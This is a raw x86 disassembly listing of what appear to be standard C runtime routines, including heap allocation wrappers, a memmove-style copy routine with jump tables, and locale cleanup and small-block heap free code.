  425faf:	call   0x42547b
  425fb4:	pop    ecx
  425fb5:	ret    
  425fb6:	push   esi
  425fb7:	push   0x0
  425fb9:	push   DWORD PTR ds:0x45e140
  425fbf:	call   DWORD PTR ds:0x429048
  425fc5:	call   0x42538b
  425fca:	ret    
  425fcb:	push   0xc
  425fcd:	push   0x429688
  425fd2:	call   0x425350
  425fd7:	mov    esi,DWORD PTR [ebp+0x8]
  425fda:	cmp    DWORD PTR ds:0x45e144,0x3
  425fe1:	jne    0x426011
  425fe3:	cmp    esi,DWORD PTR ds:0x45df04
  425fe9:	ja     0x426011
  425feb:	push   0x4
  425fed:	call   0x42550f
  425ff2:	pop    ecx
  425ff3:	and    DWORD PTR [ebp-0x4],0x0
  425ff7:	push   esi
  425ff8:	call   0x426f11
  425ffd:	pop    ecx
  425ffe:	mov    DWORD PTR [ebp-0x1c],eax
  426001:	or     DWORD PTR [ebp-0x4],0xffffffff
  426005:	call   0x42603d
  42600a:	mov    eax,DWORD PTR [ebp-0x1c]
  42600d:	test   eax,eax
  42600f:	jne    0x426034
  426011:	test   esi,esi
  426013:	jne    0x426016
  426015:	inc    esi
  426016:	cmp    DWORD PTR ds:0x45e144,0x1
  42601d:	je     0x426025
  42601f:	add    esi,0xf
  426022:	and    esi,0xfffffff0
  426025:	push   esi
  426026:	push   0x0
  426028:	push   DWORD PTR ds:0x45e140
  42602e:	call   DWORD PTR ds:0x429030
  426034:	call   0x42538b
  426039:	ret    
  42603a:	mov    esi,DWORD PTR [ebp+0x8]
  42603d:	push   0x4
  42603f:	call   0x42547b
  426044:	pop    ecx
  426045:	ret    
  426046:	cmp    DWORD PTR [esp+0x4],0xffffffe0
  42604b:	ja     0x42606f
  42604d:	push   DWORD PTR [esp+0x4]
  426051:	call   0x425fcb
  426056:	test   eax,eax
  426058:	pop    ecx
  426059:	jne    0x426071
  42605b:	cmp    DWORD PTR [esp+0x8],eax
  42605f:	je     0x426071
  426061:	push   DWORD PTR [esp+0x4]
  426065:	call   0x427c32
  42606a:	test   eax,eax
  42606c:	pop    ecx
  42606d:	jne    0x42604d
  42606f:	xor    eax,eax
  426071:	ret    
  426072:	push   DWORD PTR ds:0x45ddc8
  426078:	push   DWORD PTR [esp+0x8]
  42607c:	call   0x426046
  426081:	pop    ecx
  426082:	pop    ecx
  426083:	ret    
  426084:	int3   
  426085:	int3   
  426086:	int3   
  426087:	int3   
  426088:	int3   
  426089:	int3   
  42608a:	int3   
  42608b:	int3   
  42608c:	int3   
  42608d:	int3   
  42608e:	int3   
  42608f:	int3   
  426090:	push   ebp
  426091:	mov    ebp,esp
  426093:	push   edi
  426094:	push   esi
  426095:	mov    esi,DWORD PTR [ebp+0xc]
  426098:	mov    ecx,DWORD PTR [ebp+0x10]
  42609b:	mov    edi,DWORD PTR [ebp+0x8]
  42609e:	mov    eax,ecx
  4260a0:	mov    edx,ecx
  4260a2:	add    eax,esi
  4260a4:	cmp    edi,esi
  4260a6:	jbe    0x4260b0
  4260a8:	cmp    edi,eax
  4260aa:	jb     0x42622c
  4260b0:	test   edi,0x3
  4260b6:	jne    0x4260cc
  4260b8:	shr    ecx,0x2
  4260bb:	and    edx,0x3
  4260be:	cmp    ecx,0x8
  4260c1:	jb     0x4260ec
  4260c3:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4260c5:	jmp    DWORD PTR [edx*4+0x4261dc]
  4260cc:	mov    eax,edi
  4260ce:	mov    edx,0x3
  4260d3:	sub    ecx,0x4
  4260d6:	jb     0x4260e4
  4260d8:	and    eax,0x3
  4260db:	add    ecx,eax
  4260dd:	jmp    DWORD PTR [eax*4+0x4260f0]
  4260e4:	jmp    DWORD PTR [ecx*4+0x4261ec]
  4260eb:	nop
  4260ec:	jmp    DWORD PTR [ecx*4+0x426170]
  4260f3:	nop
  4260f4:	add    BYTE PTR [ecx+0x42],ah
  4260f7:	add    BYTE PTR [ecx+eiz*2],ch
  4260fa:	inc    edx
  4260fb:	add    BYTE PTR [eax+0x61],dl
  4260fe:	inc    edx
  4260ff:	add    BYTE PTR [ebx],ah
  426101:	ror    DWORD PTR [edx-0x75f877fa],1
  426107:	inc    esi
  426108:	add    DWORD PTR [eax+0x468a0147],ecx
  42610e:	add    al,cl
  426110:	jmp    0x289e917
  426115:	add    esi,0x3
  426118:	add    edi,0x3
  42611b:	cmp    ecx,0x8
  42611e:	jb     0x4260ec
  426120:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426122:	jmp    DWORD PTR [edx*4+0x4261dc]
  426129:	lea    ecx,[ecx+0x0]
  42612c:	and    edx,ecx
  42612e:	mov    al,BYTE PTR [esi]
  426130:	mov    BYTE PTR [edi],al
  426132:	mov    al,BYTE PTR [esi+0x1]
  426135:	shr    ecx,0x2
  426138:	mov    BYTE PTR [edi+0x1],al
  42613b:	add    esi,0x2
  42613e:	add    edi,0x2
  426141:	cmp    ecx,0x8
  426144:	jb     0x4260ec
  426146:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426148:	jmp    DWORD PTR [edx*4+0x4261dc]
  42614f:	nop
  426150:	and    edx,ecx
  426152:	mov    al,BYTE PTR [esi]
  426154:	mov    BYTE PTR [edi],al
  426156:	add    esi,0x1
  426159:	shr    ecx,0x2
  42615c:	add    edi,0x1
  42615f:	cmp    ecx,0x8
  426162:	jb     0x4260ec
  426164:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426166:	jmp    DWORD PTR [edx*4+0x4261dc]
  42616d:	lea    ecx,[ecx+0x0]
  426170:	shl    DWORD PTR [ecx+0x42],cl
  426173:	add    al,al
  426175:	popa   
  426176:	inc    edx
  426177:	add    BYTE PTR [eax-0x4fffbd9f],bh
  42617d:	popa   
  42617e:	inc    edx
  42617f:	add    BYTE PTR [eax-0x5fffbd9f],ch
  426185:	popa   
  426186:	inc    edx
  426187:	add    BYTE PTR [eax-0x6fffbd9f],bl
  42618d:	popa   
  42618e:	inc    edx
  42618f:	add    BYTE PTR [ebx-0x761b71bc],cl
  426195:	inc    esp
  426196:	(bad)  
  426197:	in     al,0x8b
  426199:	inc    esp
  42619a:	mov    gs,eax
  42619c:	mov    DWORD PTR [edi+ecx*4-0x18],eax
  4261a0:	mov    eax,DWORD PTR [esi+ecx*4-0x14]
  4261a4:	mov    DWORD PTR [edi+ecx*4-0x14],eax
  4261a8:	mov    eax,DWORD PTR [esi+ecx*4-0x10]
  4261ac:	mov    DWORD PTR [edi+ecx*4-0x10],eax
  4261b0:	mov    eax,DWORD PTR [esi+ecx*4-0xc]
  4261b4:	mov    DWORD PTR [edi+ecx*4-0xc],eax
  4261b8:	mov    eax,DWORD PTR [esi+ecx*4-0x8]
  4261bc:	mov    DWORD PTR [edi+ecx*4-0x8],eax
  4261c0:	mov    eax,DWORD PTR [esi+ecx*4-0x4]
  4261c4:	mov    DWORD PTR [edi+ecx*4-0x4],eax
  4261c8:	lea    eax,[ecx*4+0x0]
  4261cf:	add    esi,eax
  4261d1:	add    edi,eax
  4261d3:	jmp    DWORD PTR [edx*4+0x4261dc]
  4261da:	mov    edi,edi
  4261dc:	in     al,dx
  4261dd:	popa   
  4261de:	inc    edx
  4261df:	add    ah,dh
  4261e1:	popa   
  4261e2:	inc    edx
  4261e3:	add    BYTE PTR [eax],al
  4261e5:	bound  eax,QWORD PTR [edx+0x0]
  4261e8:	adc    al,0x62
  4261ea:	inc    edx
  4261eb:	add    BYTE PTR [ebx+0x5f5e0845],cl
  4261f1:	leave  
  4261f2:	ret    
  4261f3:	nop
  4261f4:	mov    al,BYTE PTR [esi]
  4261f6:	mov    BYTE PTR [edi],al
  4261f8:	mov    eax,DWORD PTR [ebp+0x8]
  4261fb:	pop    esi
  4261fc:	pop    edi
  4261fd:	leave  
  4261fe:	ret    
  4261ff:	nop
  426200:	mov    al,BYTE PTR [esi]
  426202:	mov    BYTE PTR [edi],al
  426204:	mov    al,BYTE PTR [esi+0x1]
  426207:	mov    BYTE PTR [edi+0x1],al
  42620a:	mov    eax,DWORD PTR [ebp+0x8]
  42620d:	pop    esi
  42620e:	pop    edi
  42620f:	leave  
  426210:	ret    
  426211:	lea    ecx,[ecx+0x0]
  426214:	mov    al,BYTE PTR [esi]
  426216:	mov    BYTE PTR [edi],al
  426218:	mov    al,BYTE PTR [esi+0x1]
  42621b:	mov    BYTE PTR [edi+0x1],al
  42621e:	mov    al,BYTE PTR [esi+0x2]
  426221:	mov    BYTE PTR [edi+0x2],al
  426224:	mov    eax,DWORD PTR [ebp+0x8]
  426227:	pop    esi
  426228:	pop    edi
  426229:	leave  
  42622a:	ret    
  42622b:	nop
  42622c:	lea    esi,[ecx+esi*1-0x4]
  426230:	lea    edi,[ecx+edi*1-0x4]
  426234:	test   edi,0x3
  42623a:	jne    0x426260
  42623c:	shr    ecx,0x2
  42623f:	and    edx,0x3
  426242:	cmp    ecx,0x8
  426245:	jb     0x426254
  426247:	std    
  426248:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42624a:	cld    
  42624b:	jmp    DWORD PTR [edx*4+0x426378]
  426252:	mov    edi,edi
  426254:	neg    ecx
  426256:	jmp    DWORD PTR [ecx*4+0x426328]
  42625d:	lea    ecx,[ecx+0x0]
  426260:	mov    eax,edi
  426262:	mov    edx,0x3
  426267:	cmp    ecx,0x4
  42626a:	jb     0x426278
  42626c:	and    eax,0x3
  42626f:	sub    ecx,eax
  426271:	jmp    DWORD PTR [eax*4+0x42627c]
  426278:	jmp    DWORD PTR [ecx*4+0x426378]
  42627f:	nop
  426280:	mov    WORD PTR [edx+0x42],fs
  426283:	add    BYTE PTR [eax-0x27ffbd9e],dh
  426289:	bound  eax,QWORD PTR [edx+0x0]
  42628c:	mov    al,BYTE PTR [esi+0x3]
  42628f:	and    edx,ecx
  426291:	mov    BYTE PTR [edi+0x3],al
  426294:	sub    esi,0x1
  426297:	shr    ecx,0x2
  42629a:	sub    edi,0x1
  42629d:	cmp    ecx,0x8
  4262a0:	jb     0x426254
  4262a2:	std    
  4262a3:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4262a5:	cld    
  4262a6:	jmp    DWORD PTR [edx*4+0x426378]
  4262ad:	lea    ecx,[ecx+0x0]
  4262b0:	mov    al,BYTE PTR [esi+0x3]
  4262b3:	and    edx,ecx
  4262b5:	mov    BYTE PTR [edi+0x3],al
  4262b8:	mov    al,BYTE PTR [esi+0x2]
  4262bb:	shr    ecx,0x2
  4262be:	mov    BYTE PTR [edi+0x2],al
  4262c1:	sub    esi,0x2
  4262c4:	sub    edi,0x2
  4262c7:	cmp    ecx,0x8
  4262ca:	jb     0x426254
  4262cc:	std    
  4262cd:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4262cf:	cld    
  4262d0:	jmp    DWORD PTR [edx*4+0x426378]
  4262d7:	nop
  4262d8:	mov    al,BYTE PTR [esi+0x3]
  4262db:	and    edx,ecx
  4262dd:	mov    BYTE PTR [edi+0x3],al
  4262e0:	mov    al,BYTE PTR [esi+0x2]
  4262e3:	mov    BYTE PTR [edi+0x2],al
  4262e6:	mov    al,BYTE PTR [esi+0x1]
  4262e9:	shr    ecx,0x2
  4262ec:	mov    BYTE PTR [edi+0x1],al
  4262ef:	sub    esi,0x3
  4262f2:	sub    edi,0x3
  4262f5:	cmp    ecx,0x8
  4262f8:	jb     0x426254
  4262fe:	std    
  4262ff:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426301:	cld    
  426302:	jmp    DWORD PTR [edx*4+0x426378]
  426309:	lea    ecx,[ecx+0x0]
  42630c:	sub    al,0x63
  42630e:	inc    edx
  42630f:	add    BYTE PTR [ebx+eiz*2],dh
  426312:	inc    edx
  426313:	add    BYTE PTR [ebx+eiz*2],bh
  426316:	inc    edx
  426317:	add    BYTE PTR [ebx+eiz*2+0x42],al
  42631b:	add    BYTE PTR [ebx+eiz*2+0x42],cl
  42631f:	add    BYTE PTR [ebx+eiz*2+0x42],dl
  426323:	add    BYTE PTR [ebx+eiz*2+0x42],bl
  426327:	add    BYTE PTR [edi+0x63],ch
  42632a:	inc    edx
  42632b:	add    BYTE PTR [ebx-0x76e371bc],cl
  426331:	inc    esp
  426332:	(bad)  
  426333:	sbb    al,0x8b
  426335:	inc    esp
  426336:	mov    ds,WORD PTR [eax]
  426338:	mov    DWORD PTR [edi+ecx*4+0x18],eax
  42633c:	mov    eax,DWORD PTR [esi+ecx*4+0x14]
  426340:	mov    DWORD PTR [edi+ecx*4+0x14],eax
  426344:	mov    eax,DWORD PTR [esi+ecx*4+0x10]
  426348:	mov    DWORD PTR [edi+ecx*4+0x10],eax
  42634c:	mov    eax,DWORD PTR [esi+ecx*4+0xc]
  426350:	mov    DWORD PTR [edi+ecx*4+0xc],eax
  426354:	mov    eax,DWORD PTR [esi+ecx*4+0x8]
  426358:	mov    DWORD PTR [edi+ecx*4+0x8],eax
  42635c:	mov    eax,DWORD PTR [esi+ecx*4+0x4]
  426360:	mov    DWORD PTR [edi+ecx*4+0x4],eax
  426364:	lea    eax,[ecx*4+0x0]
  42636b:	add    esi,eax
  42636d:	add    edi,eax
  42636f:	jmp    DWORD PTR [edx*4+0x426378]
  426376:	mov    edi,edi
  426378:	mov    BYTE PTR [ebx+0x42],ah
  42637b:	add    BYTE PTR [eax-0x5fffbd9d],dl
  426381:	arpl   WORD PTR [edx+0x0],ax
  426384:	mov    ah,0x63
  426386:	inc    edx
  426387:	add    BYTE PTR [ebx+0x5f5e0845],cl
  42638d:	leave  
  42638e:	ret    
  42638f:	nop
  426390:	mov    al,BYTE PTR [esi+0x3]
  426393:	mov    BYTE PTR [edi+0x3],al
  426396:	mov    eax,DWORD PTR [ebp+0x8]
  426399:	pop    esi
  42639a:	pop    edi
  42639b:	leave  
  42639c:	ret    
  42639d:	lea    ecx,[ecx+0x0]
  4263a0:	mov    al,BYTE PTR [esi+0x3]
  4263a3:	mov    BYTE PTR [edi+0x3],al
  4263a6:	mov    al,BYTE PTR [esi+0x2]
  4263a9:	mov    BYTE PTR [edi+0x2],al
  4263ac:	mov    eax,DWORD PTR [ebp+0x8]
  4263af:	pop    esi
  4263b0:	pop    edi
  4263b1:	leave  
  4263b2:	ret    
  4263b3:	nop
  4263b4:	mov    al,BYTE PTR [esi+0x3]
  4263b7:	mov    BYTE PTR [edi+0x3],al
  4263ba:	mov    al,BYTE PTR [esi+0x2]
  4263bd:	mov    BYTE PTR [edi+0x2],al
  4263c0:	mov    al,BYTE PTR [esi+0x1]
  4263c3:	mov    BYTE PTR [edi+0x1],al
  4263c6:	mov    eax,DWORD PTR [ebp+0x8]
  4263c9:	pop    esi
  4263ca:	pop    edi
  4263cb:	leave  
  4263cc:	ret    
  4263cd:	push   DWORD PTR [esp+0x4]
  4263d1:	call   DWORD PTR ds:0x4290cc
  4263d7:	xor    eax,eax
  4263d9:	inc    eax
  4263da:	ret    0x8
  4263dd:	push   0x10
  4263df:	push   0x4296d0
  4263e4:	call   0x425350
  4263e9:	mov    eax,ds:0x45dd88
  4263ee:	test   eax,eax
  4263f0:	jne    0x426429
  4263f2:	cmp    DWORD PTR ds:0x45dac4,0x1
  4263f9:	je     0x42641f
  4263fb:	push   0x4296bc
  426400:	call   DWORD PTR ds:0x429024
  426406:	test   eax,eax
  426408:	je     0x42641f
  42640a:	push   0x429694
  42640f:	push   eax
  426410:	call   DWORD PTR ds:0x429020
  426416:	mov    ds:0x45dd88,eax
  42641b:	test   eax,eax
  42641d:	jne    0x426429
  42641f:	mov    eax,0x4263cd
  426424:	mov    ds:0x45dd88,eax
  426429:	and    DWORD PTR [ebp-0x4],0x0
  42642d:	push   DWORD PTR [ebp+0xc]
  426430:	push   DWORD PTR [ebp+0x8]
  426433:	call   eax
  426435:	mov    DWORD PTR [ebp-0x1c],eax
  426438:	jmp    0x42645e
  42643a:	mov    eax,DWORD PTR [ebp-0x14]
  42643d:	mov    eax,DWORD PTR [eax]
  42643f:	mov    eax,DWORD PTR [eax]
  426441:	mov    DWORD PTR [ebp-0x20],eax
  426444:	xor    eax,eax
  426446:	inc    eax
  426447:	ret    
  426448:	mov    esp,DWORD PTR [ebp-0x18]
  42644b:	cmp    DWORD PTR [ebp-0x20],0xc0000017
  426452:	jne    0x42645c
  426454:	push   0x8
  426456:	call   DWORD PTR ds:0x429098
  42645c:	xor    eax,eax
  42645e:	or     DWORD PTR [ebp-0x4],0xffffffff
  426462:	call   0x42538b
  426467:	ret    
  426468:	push   0x10
  42646a:	push   0x4296e0
  42646f:	call   0x425350
  426474:	mov    esi,DWORD PTR [ebp+0x8]
  426477:	imul   esi,DWORD PTR [ebp+0xc]
  42647b:	mov    DWORD PTR [ebp-0x1c],esi
  42647e:	test   esi,esi
  426480:	jne    0x426483
  426482:	inc    esi
  426483:	xor    edi,edi
  426485:	mov    DWORD PTR [ebp-0x20],edi
  426488:	cmp    esi,0xffffffe0
  42648b:	ja     0x4264f2
  42648d:	cmp    DWORD PTR ds:0x45e144,0x3
  426494:	jne    0x4264dd
  426496:	add    esi,0xf
  426499:	and    esi,0xfffffff0
  42649c:	mov    DWORD PTR [ebp+0xc],esi
  42649f:	mov    ebx,DWORD PTR [ebp-0x1c]
  4264a2:	cmp    ebx,DWORD PTR ds:0x45df04
  4264a8:	ja     0x4264dd
  4264aa:	push   0x4
  4264ac:	call   0x42550f
  4264b1:	pop    ecx
  4264b2:	and    DWORD PTR [ebp-0x4],edi
  4264b5:	push   ebx
  4264b6:	call   0x426f11
  4264bb:	pop    ecx
  4264bc:	mov    DWORD PTR [ebp-0x20],eax
  4264bf:	or     DWORD PTR [ebp-0x4],0xffffffff
  4264c3:	call   0x426512
  4264c8:	mov    edi,DWORD PTR [ebp-0x20]
  4264cb:	test   edi,edi
  4264cd:	je     0x4264e1
  4264cf:	push   DWORD PTR [ebp-0x1c]
  4264d2:	push   0x0
  4264d4:	push   edi
  4264d5:	call   0x427c50
  4264da:	add    esp,0xc
  4264dd:	test   edi,edi
  4264df:	jne    0x42651b
  4264e1:	push   esi
  4264e2:	push   0x8
  4264e4:	push   DWORD PTR ds:0x45e140
  4264ea:	call   DWORD PTR ds:0x429030
  4264f0:	mov    edi,eax
  4264f2:	test   edi,edi
  4264f4:	jne    0x42651b
  4264f6:	cmp    DWORD PTR ds:0x45ddc8,edi
  4264fc:	je     0x42651b
  4264fe:	push   esi
  4264ff:	call   0x427c32
  426504:	pop    ecx
  426505:	test   eax,eax
  426507:	jne    0x426483
  42650d:	jmp    0x42651d
  42650f:	mov    esi,DWORD PTR [ebp+0xc]
  426512:	push   0x4
  426514:	call   0x42547b
  426519:	pop    ecx
  42651a:	ret    
  42651b:	mov    eax,edi
  42651d:	call   0x42538b
  426522:	ret    
  426523:	push   esi
  426524:	mov    esi,DWORD PTR [esp+0x8]
  426528:	mov    eax,DWORD PTR [esi+0x3c]
  42652b:	push   edi
  42652c:	xor    edi,edi
  42652e:	cmp    eax,DWORD PTR ds:0x45ddd4
  426534:	je     0x426599
  426536:	cmp    eax,edi
  426538:	je     0x426599
  42653a:	mov    eax,DWORD PTR [esi+0x2c]
  42653d:	cmp    DWORD PTR [eax],edi
  42653f:	jne    0x426599
  426541:	mov    eax,DWORD PTR [esi+0x34]
  426544:	cmp    eax,edi
  426546:	je     0x426564
  426548:	cmp    DWORD PTR [eax],edi
  42654a:	jne    0x426564
  42654c:	cmp    eax,DWORD PTR ds:0x45def0
  426552:	je     0x426564
  426554:	push   eax
  426555:	call   0x425f5a
  42655a:	push   DWORD PTR [esi+0x3c]
  42655d:	call   0x427e9f
  426562:	pop    ecx
  426563:	pop    ecx
  426564:	mov    eax,DWORD PTR [esi+0x30]
  426567:	cmp    eax,edi
  426569:	je     0x426587
  42656b:	cmp    DWORD PTR [eax],edi
  42656d:	jne    0x426587
  42656f:	cmp    eax,DWORD PTR ds:0x45def4
  426575:	je     0x426587
  426577:	push   eax
  426578:	call   0x425f5a
  42657d:	push   DWORD PTR [esi+0x3c]
  426580:	call   0x427e40
  426585:	pop    ecx
  426586:	pop    ecx
  426587:	push   DWORD PTR [esi+0x2c]
  42658a:	call   0x425f5a
  42658f:	push   DWORD PTR [esi+0x3c]
  426592:	call   0x425f5a
  426597:	pop    ecx
  426598:	pop    ecx
  426599:	mov    eax,DWORD PTR [esi+0x40]
  42659c:	cmp    eax,DWORD PTR ds:0x45deec
  4265a2:	je     0x4265bc
  4265a4:	cmp    eax,edi
  4265a6:	je     0x4265bc
  4265a8:	cmp    DWORD PTR [eax],edi
  4265aa:	jne    0x4265bc
  4265ac:	push   eax
  4265ad:	call   0x425f5a
  4265b2:	push   DWORD PTR [esi+0x44]
  4265b5:	call   0x425f5a
  4265ba:	pop    ecx
  4265bb:	pop    ecx
  4265bc:	mov    eax,DWORD PTR [esi+0x50]
  4265bf:	cmp    eax,DWORD PTR ds:0x45ddd0
  4265c5:	je     0x4265e3
  4265c7:	cmp    eax,edi
  4265c9:	je     0x4265e3
  4265cb:	cmp    DWORD PTR [eax+0xb4],edi
  4265d1:	jne    0x4265e3
  4265d3:	push   eax
  4265d4:	call   0x427cb0
  4265d9:	push   DWORD PTR [esi+0x50]
  4265dc:	call   0x425f5a
  4265e1:	pop    ecx
  4265e2:	pop    ecx
  4265e3:	push   esi
  4265e4:	call   0x425f5a
  4265e9:	pop    ecx
  4265ea:	pop    edi
  4265eb:	pop    esi
  4265ec:	ret    
  4265ed:	push   esi
  4265ee:	call   0x425203
  4265f3:	mov    esi,eax
  4265f5:	mov    eax,DWORD PTR [esi+0x64]
  4265f8:	cmp    eax,DWORD PTR ds:0x45d58c
  4265fe:	je     0x4266aa
  426604:	test   eax,eax
  426606:	je     0x426637
  426608:	mov    ecx,DWORD PTR [eax+0x2c]
  42660b:	dec    DWORD PTR [eax]
  42660d:	test   ecx,ecx
  42660f:	je     0x426613
  426611:	dec    DWORD PTR [ecx]
  426613:	mov    ecx,DWORD PTR [eax+0x34]
  426616:	test   ecx,ecx
  426618:	je     0x42661c
  42661a:	dec    DWORD PTR [ecx]
  42661c:	mov    ecx,DWORD PTR [eax+0x30]
  42661f:	test   ecx,ecx
  426621:	je     0x426625
  426623:	dec    DWORD PTR [ecx]
  426625:	mov    ecx,DWORD PTR [eax+0x40]
  426628:	test   ecx,ecx
  42662a:	je     0x42662e
  42662c:	dec    DWORD PTR [ecx]
  42662e:	mov    ecx,DWORD PTR [eax+0x4c]
  426631:	dec    DWORD PTR [ecx+0xb4]
  426637:	mov    ecx,DWORD PTR ds:0x45d58c
  42663d:	mov    DWORD PTR [esi+0x64],ecx
  426640:	mov    ecx,DWORD PTR ds:0x45d58c
  426646:	inc    DWORD PTR [ecx]
  426648:	mov    ecx,DWORD PTR ds:0x45d58c
  42664e:	mov    ecx,DWORD PTR [ecx+0x2c]
  426651:	test   ecx,ecx
  426653:	je     0x426657
  426655:	inc    DWORD PTR [ecx]
  426657:	mov    ecx,DWORD PTR ds:0x45d58c
  42665d:	mov    ecx,DWORD PTR [ecx+0x34]
  426660:	test   ecx,ecx
  426662:	je     0x426666
  426664:	inc    DWORD PTR [ecx]
  426666:	mov    ecx,DWORD PTR ds:0x45d58c
  42666c:	mov    ecx,DWORD PTR [ecx+0x30]
  42666f:	test   ecx,ecx
  426671:	je     0x426675
  426673:	inc    DWORD PTR [ecx]
  426675:	mov    ecx,DWORD PTR ds:0x45d58c
  42667b:	mov    ecx,DWORD PTR [ecx+0x40]
  42667e:	test   ecx,ecx
  426680:	je     0x426684
  426682:	inc    DWORD PTR [ecx]
  426684:	mov    ecx,DWORD PTR ds:0x45d58c
  42668a:	mov    ecx,DWORD PTR [ecx+0x4c]
  42668d:	inc    DWORD PTR [ecx+0xb4]
  426693:	test   eax,eax
  426695:	je     0x4266aa
  426697:	cmp    DWORD PTR [eax],0x0
  42669a:	jne    0x4266aa
  42669c:	cmp    eax,0x45d538
  4266a1:	je     0x4266aa
  4266a3:	push   eax
  4266a4:	call   0x426523
  4266a9:	pop    ecx
  4266aa:	mov    eax,DWORD PTR [esi+0x64]
  4266ad:	pop    esi
  4266ae:	ret    
  4266af:	push   0xc
  4266b1:	push   0x429870
  4266b6:	call   0x425350
  4266bb:	push   0xc
  4266bd:	call   0x42550f
  4266c2:	pop    ecx
  4266c3:	and    DWORD PTR [ebp-0x4],0x0
  4266c7:	call   0x4265ed
  4266cc:	mov    DWORD PTR [ebp-0x1c],eax
  4266cf:	or     DWORD PTR [ebp-0x4],0xffffffff
  4266d3:	call   0x4266e1
  4266d8:	mov    eax,DWORD PTR [ebp-0x1c]
  4266db:	call   0x42538b
  4266e0:	ret    
  4266e1:	push   0xc
  4266e3:	call   0x42547b
  4266e8:	pop    ecx
  4266e9:	ret    
  4266ea:	push   0x140
  4266ef:	push   0x0
  4266f1:	push   DWORD PTR ds:0x45e140
  4266f7:	call   DWORD PTR ds:0x429030
  4266fd:	test   eax,eax
  4266ff:	mov    ds:0x45df00,eax
  426704:	jne    0x426707
  426706:	ret    
  426707:	mov    ecx,DWORD PTR [esp+0x4]
  42670b:	and    DWORD PTR ds:0x45def8,0x0
  426712:	and    DWORD PTR ds:0x45defc,0x0
  426719:	mov    ds:0x45df08,eax
  42671e:	xor    eax,eax
  426720:	mov    DWORD PTR ds:0x45df04,ecx
  426726:	mov    DWORD PTR ds:0x45df0c,0x10
  426730:	inc    eax
  426731:	ret    
  426732:	mov    eax,ds:0x45defc
  426737:	lea    ecx,[eax+eax*4]
  42673a:	mov    eax,ds:0x45df00
  42673f:	lea    ecx,[eax+ecx*4]
  426742:	jmp    0x426756
  426744:	mov    edx,DWORD PTR [esp+0x4]
  426748:	sub    edx,DWORD PTR [eax+0xc]
  42674b:	cmp    edx,0x100000
  426751:	jb     0x42675c
  426753:	add    eax,0x14
  426756:	cmp    eax,ecx
  426758:	jb     0x426744
  42675a:	xor    eax,eax
  42675c:	ret    
  42675d:	push   ebp
  42675e:	mov    ebp,esp
  426760:	sub    esp,0x10
  426763:	mov    ecx,DWORD PTR [ebp+0x8]
  426766:	mov    eax,DWORD PTR [ecx+0x10]
  426769:	push   esi
  42676a:	mov    esi,DWORD PTR [ebp+0xc]
  42676d:	push   edi
  42676e:	mov    edi,esi
  426770:	sub    edi,DWORD PTR [ecx+0xc]
  426773:	add    esi,0xfffffffc
  426776:	shr    edi,0xf
  426779:	mov    ecx,edi
  42677b:	imul   ecx,ecx,0x204
  426781:	lea    ecx,[ecx+eax*1+0x144]
  426788:	mov    DWORD PTR [ebp-0x10],ecx
  42678b:	mov    ecx,DWORD PTR [esi]
  42678d:	dec    ecx
  42678e:	test   cl,0x1
  426791:	mov    DWORD PTR [ebp-0x4],ecx
  426794:	jne    0x426a71
  42679a:	push   ebx
  42679b:	lea    ebx,[ecx+esi*1]
  42679e:	mov    edx,DWORD PTR [ebx]
  4267a0:	mov    DWORD PTR [ebp-0xc],edx
  4267a3:	mov    edx,DWORD PTR [esi-0x4]
  4267a6:	mov    DWORD PTR [ebp-0x8],edx
  4267a9:	mov    edx,DWORD PTR [ebp-0xc]
  4267ac:	test   dl,0x1
  4267af:	mov    DWORD PTR [ebp+0xc],ebx
  4267b2:	jne    0x426828
  4267b4:	sar    edx,0x4
  4267b7:	dec    edx
  4267b8:	cmp    edx,0x3f
  4267bb:	jbe    0x4267c0
  4267bd:	push   0x3f
  4267bf:	pop    edx
  4267c0:	mov    ecx,DWORD PTR [ebx+0x4]
  4267c3:	cmp    ecx,DWORD PTR [ebx+0x8]
  4267c6:	jne    0x42680a
  4267c8:	cmp    edx,0x20
  4267cb:	mov    ebx,0x80000000
  4267d0:	jae    0x4267eb
  4267d2:	mov    ecx,edx
  4267d4:	shr    ebx,cl
  4267d6:	lea    ecx,[edx+eax*1+0x4]
  4267da:	not    ebx
  4267dc:	and    DWORD PTR [eax+edi*4+0x44],ebx
  4267e0:	dec    BYTE PTR [ecx]
  4267e2:	jne    0x426807
  4267e4:	mov    ecx,DWORD PTR [ebp+0x8]
  4267e7:	and    DWORD PTR [ecx],ebx
  4267e9:	jmp    0x426807
  4267eb:	lea    ecx,[edx-0x20]
  4267ee:	shr    ebx,cl
  4267f0:	lea    ecx,[edx+eax*1+0x4]
  4267f4:	not    ebx
  4267f6:	and    DWORD PTR [eax+edi*4+0xc4],ebx
  4267fd:	dec    BYTE PTR [ecx]
  4267ff:	jne    0x426807
  426801:	mov    ecx,DWORD PTR [ebp+0x8]
  426804:	and    DWORD PTR [ecx+0x4],ebx
  426807:	mov    ebx,DWORD PTR [ebp+0xc]
  42680a:	mov    edx,DWORD PTR [ebx+0x8]
  42680d:	mov    ebx,DWORD PTR [ebx+0x4]
  426810:	mov    ecx,DWORD PTR [ebp-0x4]
  426813:	add    ecx,DWORD PTR [ebp-0xc]
  426816:	mov    DWORD PTR [edx+0x4],ebx
  426819:	mov    edx,DWORD PTR [ebp+0xc]
  42681c:	mov    ebx,DWORD PTR [edx+0x4]
  42681f:	mov    edx,DWORD PTR [edx+0x8]
  426822:	mov    DWORD PTR [ebx+0x8],edx
  426825:	mov    DWORD PTR [ebp-0x4],ecx
  426828:	mov    edx,ecx
  42682a:	sar    edx,0x4
  42682d:	dec    edx
  42682e:	cmp    edx,0x3f
  426831:	jbe    0x426836
  426833:	push   0x3f
  426835:	pop    edx
  426836:	mov    ebx,DWORD PTR [ebp-0x8]
  426839:	and    ebx,0x1
  42683c:	mov    DWORD PTR [ebp-0xc],ebx
  42683f:	jne    0x4268d4
  426845:	sub    esi,DWORD PTR [ebp-0x8]
  426848:	mov    ebx,DWORD PTR [ebp-0x8]
  42684b:	sar    ebx,0x4
  42684e:	push   0x3f
  426850:	mov    DWORD PTR [ebp+0xc],esi
  426853:	dec    ebx
  426854:	pop    esi
